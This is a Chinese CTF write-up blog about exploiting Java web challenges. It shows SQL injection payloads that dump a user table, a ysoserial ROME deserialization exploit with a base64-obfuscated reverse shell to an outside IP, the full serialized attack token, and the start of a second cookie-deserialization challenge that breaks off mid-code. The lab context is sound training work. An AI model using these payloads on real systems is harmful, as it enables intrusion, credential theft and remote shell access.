class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Row;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Table</span> &#123;</span><br><span class="line">  String tableName;</span><br><span class="line">  </span><br><span class="line">  String tableDescribe;</span><br><span class="line">  </span><br><span class="line">  List&lt;Row&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTableDescribe</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.tableDescribe;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTableDescribe</span><span class="params">(String tableDescribe)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.tableDescribe = tableDescribe;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getTableName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.tableName;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTableName</span><span class="params">(String tableName)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.tableName = tableName;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> List&lt;Row&gt; <span class="title function_">getList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.list;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setList</span><span class="params">(List&lt;Row&gt; list)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.list = list;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Test.java</strong></p><p>接收dbName参数，然后调用<code>getTableData</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseCode;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.bean.ResponseResult;</span><br><span class="line"><span class="keyword">import</span> cn.abc.common.security.annotation.Access;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.SqlDict;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CrossOrigin;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/common/test&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="meta">@PostMapping(&#123;&quot;/sqlDict&quot;&#125;)</span></span><br><span class="line">  <span class="meta">@Access</span></span><br><span class="line">  <span class="meta">@ApiOperation(&quot;)</span></span><br><span class="line">  <span class="keyword">public</span> ResponseResult <span class="title function_">sqlDict</span><span class="params">(String dbName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    List&lt;Table&gt; tables = SqlDict.getTableData(dbName, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;abc@12345&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> ResponseResult.e(ResponseCode.OK, tables);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>Swagger</strong></p><p><img src="../images/image-20230525110404630.png" alt="image-20230525110404630"></p><p>这个东西就是解题关键了</p><p><strong>swagger-ui 提供了一个可视化的UI页面展示描述文件。接口的调用方、测试、项目经理等都可以在该页面中对相关接口进行查阅和做一些简单的接口请求。该项目支持在线导入描述文件和本地部署UI项目。</strong></p><p>查资料会查到<code>swagger-ui.html</code></p><p>访问<code>swagger-ui.html</code>，会看到有三个路由，分别对应不同的功能，注意看第三个功能，对应着jar包中<code>Test.class</code>，我们可以通过传<code>dbName</code>来进行sql注入</p><p><img src="../images/image-20230525110943768.png" alt="image-20230525110943768"></p><p>这个sqlDict就是我们jar包里给的文件了，下麦呢的dbName就是我们可以进行sql注入的地方</p><p>因为这个的sql语句在jar里面已经给出了，那么就可以直接进行sql注入了</p><p>(<strong>并且这里还不对查询语句进行检测</strong>)</p><h3 id="Jdbc-sql注入"><a href="#Jdbc-sql注入" class="headerlink" title="Jdbc sql注入"></a>Jdbc sql注入</h3><p><img src="../images/image-20230525112531672.png" alt="image-20230525112531672"></p><p>这里的<code>myapp</code>是因为</p><p><img src="../images/image-20230525112618567.png" alt="image-20230525112618567"></p><p>所以就是<code>myapp</code></p><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">获取所有数据库的名字</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(SCHEMA_NAME)from(information_schema.schemata)#</span><br><span class="line">结果</span><br><span class="line">information_schema,myapp,mysql,performance_schema,sys</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525112806875.png" alt="image-20230525112806875"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(table_name)from(information_schema.tables)where(table_schema=&#x27;myapp&#x27;)#</span><br><span class="line">结果</span><br><span class="line">user</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113000057.png" alt="image-20230525113000057"></p><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(column_name)from(information_schema.columns)where((table_schema=&#x27;myapp&#x27;)and(table_name=&#x27;user&#x27;))#</span><br><span class="line">结果</span><br><span class="line">id,name,pwd</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113118589.png" alt="image-20230525113118589"></p><h4 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dbName=myapp#&#x27; union select group_concat(id)from(user)#</span><br><span class="line">结果 1</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(name)from(user)#</span><br><span class="line">结果 admin</span><br><span class="line">dbName=myapp#&#x27; union select group_concat(pwd)from(user)#</span><br><span class="line">结果 </span><br></pre></td></tr></table></figure><p>然后将用户名和密码在<code>/common/user/login</code>处提交，获取一串字符串</p><p><img src="../images/image-20230525113238116.png" alt="image-20230525113238116"></p><p>下面是使用curl命令进行POST发包  记录一下这个操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --header &#x27;Content-Type: application/json&#x27; --header &#x27;Accept: application/json&#x27; -d &#x27;&#123; \ </span><br><span class="line">   &quot;password&quot;: &quot;admin&quot;, \ </span><br><span class="line">   &quot;username&quot;: &quot;admin%40Rrrr_ctf_asde&quot; \ </span><br><span class="line"> &#125;&#x27; &#x27;http://1250b81b-263f-47e9-9375-540b6aa7c9c7.node4.buuoj.cn/common/user/login&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525113410769.png" alt="image-20230525113410769"></p><p>登录成功后返回有个base64编码的字段</p><p>将这段字符串放到<code>/common/user/current</code>处提交，然后就会发现回显了这个用户的信息</p><p><img src="../images/image-20230525113522530.png" alt="image-20230525113522530"></p><p>回显出身份信息</p><h3 id="对序列化字符串分析"><a href="#对序列化字符串分析" class="headerlink" title="对序列化字符串分析"></a>对序列化字符串分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu</span><br></pre></td></tr></table></figure><p><strong>下方的特征可以作为序列化的标志参考:</strong><br><strong>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。</strong><br><strong>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</strong></p><h4 id="java-Deserialization-Scanner插件使用"><a href="#java-Deserialization-Scanner插件使用" class="headerlink" title="java Deserialization Scanner插件使用"></a>java Deserialization Scanner插件使用</h4><p><img src="../images/image-20230525113734998.png" alt="image-20230525113734998"></p><p>安装一下这个插件来对这个base64编码的字符串进行分析，看是属于哪一条链子的</p><p><img src="../images/image-20230525114050230.png" alt="image-20230525114050230"></p><p>把ysoserial的jar的路径也配置一下</p><p>然后抓包(<strong>抓的是current这个包，因为base64编码的字符串是用这个发包的</strong>)，将其发送到插件中</p><p><img src="../images/image-20230525114437172.png" alt="image-20230525114437172"></p><p><img src="../images/image-20230525114547498.png" alt="image-20230525114547498"></p><p>最后发现是<code>ROME</code>链</p><p>然后就去拿ysoserial直接来打就行，然后在使用<code>current</code>这个路由来进行传参就行了</p><p>这里话直接反弹shell就行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-2874a69f61-1.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzMzODkgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; a.bin</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;a.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"><span class="built_in">print</span>(ba)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><strong>这样写的好处是到时候生成的payload会是一条直线</strong>  不会有很多换行</p><p><img src="../images/image-20230525200007224.png" alt="image-20230525200007224"></p><p>然后拿到<code>current</code>这个路由传参打就行了</p><p>注意的是<code>Bearer</code>这个前缀别忘了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAJSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WgAVX3VzZVNlcnZpY2VzTWVjaGFuaXNtTAAZX2FjY2Vzc0V4dGVybmFsU3R5bGVzaGVldHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWVxAH4AEEwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////8AdAADYWxscHVyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAb1yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAYWJhc2ggLWMge2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1ERXVOREl1TXprdU1URXdMek16T0RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0IADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXI5NzgwMzcwMTcyMDA5NQEAH0x5c29zZXJpYWwvUHduZXI5NzgwMzcwMTcyMDA5NTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABkAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFXNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHkwABF9vYmpxAH4ACXhwcQB+ACFxAH4AFXNxAH4AHXZxAH4AAnEAfgANc3EAfgAicQB+ACVxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230525201356657.png" alt="image-20230525201356657"></p><p><img src="../images/image-20230525201406655.png" alt="image-20230525201406655"></p><p>然后就可以了</p><h2 id="羊城杯-2020-A-Piece-Of-Java"><a href="#羊城杯-2020-A-Piece-Of-Java" class="headerlink" title="[羊城杯 2020]A Piece Of Java"></a>[羊城杯 2020]A Piece Of Java</h2><p><strong>考点</strong></p><p>(Java动态代理，MySQL JDBC反序列化)</p><p>题目给了个jar包，直接拿到jd-gui进行一波分析</p><p><img src="../images/image-20230526143250211.png" alt="image-20230526143250211"></p><p>看到一共有这几个java文件   那么就直接对这些文件进行分析来寻找利用链</p><p><img src="../images/image-20230526143535463.png" alt="image-20230526143535463"></p><p><img src="../images/image-20230526143544365.png" alt="image-20230526143544365"></p><p>看到了这两个信息<code>cc链</code>和mysql的连接器(任意让人想到   <strong><code>jdbc</code></strong>)</p><p><strong>MainController.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> BOOT-INF.classes.gdufs.challenge.web.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.Info;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.UserInfo;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.nibblesec.tools.SerialKiller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.CookieValue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainController</span> &#123;</span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/index&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@CookieValue(value = &quot;data&quot;, required = false)</span> String cookieData)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cookieData != <span class="literal">null</span> &amp;&amp; !cookieData.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;redirect:/hello&quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@PostMapping(&#123;&quot;/index&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line">    userinfo.setUsername(username);</span><br><span class="line">    userinfo.setPassword(password);</span><br><span class="line">    <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;data&quot;</span>, serialize(userinfo));</span><br><span class="line">    cookie.setMaxAge(<span class="number">2592000</span>);</span><br><span class="line">    response.addCookie(cookie);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/hello&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@GetMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@CookieValue(value = &quot;data&quot;, required = false)</span> String cookieData, Model model)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cookieData == <span class="literal">null</span> || cookieData.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;redirect:/index&quot;</span>; </span><br><span class="line">    <span class="type">Info</span> <span class="variable">info</span> <span class="operator">=</span> (Info)deserialize(cookieData);</span><br><span class="line">    <span class="keyword">if</span> (info != <span class="literal">null</span>)</span><br><span class="line">      model.addAttribute(<span class="string">&quot;info&quot;</span>, info.getAllInfo()); </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> String <span class="title function_">serialize</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">      oos.writeObject(obj);</span><br><span class="line">      oos.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title 